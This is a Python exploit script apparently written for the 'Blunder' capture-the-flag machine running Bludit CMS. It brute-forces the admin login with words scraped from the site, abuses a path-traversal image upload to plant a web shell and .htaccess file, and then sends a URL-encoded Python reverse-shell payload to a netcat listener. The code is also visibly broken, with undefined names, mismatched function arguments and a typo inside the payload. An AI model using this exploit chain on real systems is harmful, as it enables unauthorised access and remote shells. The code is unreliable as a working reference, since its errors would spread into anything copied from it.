#!/usr/bin/env python3
import re
import requests
from multiprocessing import Pool


def csrf_token(session, url):
    page = session.get(url, timeout=3)
    page.raise_for_status()
    match = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', page.text)
    return match.group(1) if match else None


def attempt_login(password, session, host, username):
    try:
        login_url = "%s/admin/login" % host
        token = csrf_token(session, login_url)
        data = {
            'tokenCSRF': token,
            'username': username,
            'password': password,
            'save': ''
        }
        resp = session.post(login_url,
                            headers=headers,
                            data=data,
                            allow_redirects=False)
        return (resp, password), None
    except:
        return None, "Login attempt failed"


def trigger_backconnect(session, host, local_host, local_port):
    print("[+] Popping shell in 3, 2, 1...")
    time.sleep(3)
    command = "export%20RHOSwwwT%3D%22%7B%23LHOST%23%7D%22%3Bexport%20RPORT%3D%7B%23LPORT%23%7D%3Bpython2%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(%22RHOST%22)%2Cint(os.getenv(%22RPORT%22))))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27"
    command = command.replace('%7B%23LHOST%23%7D', local_host)
    command = command.replace('%7B%23LPORT%23%7D', local_port)
    print("[+] POPPED!")
    session.get(host + "/bl-content/tmp/shell.png?cmd=" + command)


class Blunder:
    def __init__(self, host, username):
        self.host = host
        self.username = username
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent":
            "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
        })

    @property
    def words(self):
        page = self.session.get(self.host)
        content = page.content.decode('utf-8')
        reg = re.compile(r'\w+')
        return list({word for word in reg.findall(content)})

    def upload_file(session, host, name, path):
        print("[+] Uploading file %s" % name)
        try:
            upload_url = "%s/admin/ajax/upload-images" % host
            token = csrf_token(session, upload_url)
            resp = session.post(upload_url,
                                files={
                                    "images[]": (name, open(path, "rb")),
                                    "uuid": (None, "../../tmp "),
                                    "tokenCSRF": (None, token)
                                })
            resp.raise_for_status()
            if "Images uploaded" in response.text or (
                    "File type is not supported" in response.text
                    and file_name == ".htaccess"):
                print("[+] File uploaded successfully!")
                return True
            else:
                print("[!] Couldn't upload file, failed with error:")
                print("[!] %s" % response.text)
                sys.exit(1)
        except:
            print("[+] failed to upload file: %s" % name)

    def exploit(self):
        print("[+] Beginning exploit...")
        upload_file("shell.png", "files/shell.png")
        upload_file(".htaccess", "files/.htaccess")
        print("[+] Shell uploaded: %s/bl-content/tmp/shell.png" % self.host)
        self.listen_and_trigger()
        thread = threading.Thread(target=backconnect, args=[
            self.session,
        ])
        thread.start()
        os.system("nc -nvlp %s" % self.local_port)

    def run(self):
        print("[+] Starting pool")
        pool = Pool(10)

        def callback(a):
            ret, err = a
            if err != None:
                print("[+] Terminated: %s" % err)
                return pool.terminate()
            if 'location' in ret[0].headers and '/admin/dashboard' in ret[
                    0].headers['location']:
                print('[+] Success: Password is %s' % ret[1])
                pool.terminate()
                self.exploit()

        for password in self.words:
            pool.apply_async(
                attempt_login,
                args=[password, self.session, self.host, self.username],
                callback=callback)
        pool.close()
        pool.join()


def main():
    host = "http://10.10.10.191"
    username = "fergus"
    blunder = Blunder(host, username)
    blunder.run()


if __name__ == "__main__":
    main()
